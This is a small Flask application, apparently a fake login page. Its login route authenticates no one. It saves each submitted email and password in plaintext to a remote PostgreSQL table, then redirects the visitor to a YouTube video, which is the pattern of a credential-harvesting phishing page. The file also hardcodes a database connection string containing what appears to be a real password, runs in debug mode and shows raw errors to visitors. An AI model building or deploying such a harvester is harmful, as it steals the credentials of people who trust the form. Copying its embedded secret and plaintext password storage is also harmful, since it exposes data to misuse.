from flask import Flask, render_template, request, redirect
import psycopg2
from psycopg2 import sql

app = Flask(__name__)

# URL de conexión a PostgreSQL (usando el URL que proporcionaste)
DATABASE_URL = "postgresql://usuarios_db_845t_user:IXD5YERC6uyfB6GqZjdqU65hR6wvf4Gt@dpg-cu1905btq21c73bgab7g-a.oregon-postgres.render.com/usuarios_db_845t"

# Ruta principal para cargar el formulario
@app.route('/')
def index():
    return render_template('index.html')

# Ruta para procesar el inicio de sesión
@app.route('/login', methods=['POST'])
def login():
    correo = request.form['correo']
    contraseña = request.form['contraseña']

    try:
        # Conectar a la base de datos PostgreSQL
        conn = psycopg2.connect(DATABASE_URL, sslmode='require')
        cursor = conn.cursor()

        # Inserción de datos en la tabla 'usuarios'
        cursor.execute(
            "INSERT INTO usuarios (correo, contraseña) VALUES (%s, %s)",
            (correo, contraseña)
        )

        conn.commit()
        cursor.close()
        conn.close()

        # Redirigir al enlace de YouTube después de guardar los datos
        return redirect("https://youtu.be/bUkJLkoh3kA?si=rrB3V6bw3dgOgmX_")

    except Exception as e:
        # Devolver un mensaje de error y registrar en los logs
        app.logger.error(f"Error al guardar los datos: {e}")
        return f"Error al guardar los datos: {e}"

if __name__ == '__main__':
    app.run(debug=True)
